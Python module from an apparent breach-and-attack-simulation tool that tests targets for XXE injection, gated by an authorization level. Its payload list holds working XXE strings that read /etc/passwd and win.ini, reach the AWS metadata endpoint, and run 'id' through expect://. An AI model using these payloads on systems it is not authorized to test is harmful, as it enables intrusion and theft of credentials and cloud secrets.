"""
XXE Injection testing module.
MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80"> %xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
]

class XXEModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="xxe", description="XML External Entity injection", category="xxe",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A05:2021 - Security Misconfiguration",
            cwe_ids=["CWE-611"], tags=["injection", "xxe", "xml"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            p = await self._payload_db.get_payloads("xxe", limit=50)
            if p: return p
        return DEFAULT_XXE_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        return [AttackRequest(request_id=f"xxe-{uuid.uuid4().hex[:8]}", target=target, method="POST",
            path=options.get("path", "/"), body=p, content_type="application/xml",
            headers={"X-BAS-Payload": p[:100]}) for p in payloads]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        indicators = [("root:x:0:0", "critical", "/etc/passwd via XXE"), ("[extensions]", "critical", "win.ini via XXE"),
            ("ami-id", "critical", "AWS metadata via XXE"), ("uid=", "critical", "Command execution via XXE expect://")]
        for ind, sev, desc in indicators:
            if ind in body:
                return ModuleResult(module_name="xxe", target=request.target, status=VulnStatus.VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms, evidence=f"XXE confirmed: {desc}", severity=sev,
                    mitre_technique_id="T1190", detail={"detection_type": "xxe_file_read"})
        return ModuleResult(module_name="xxe", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
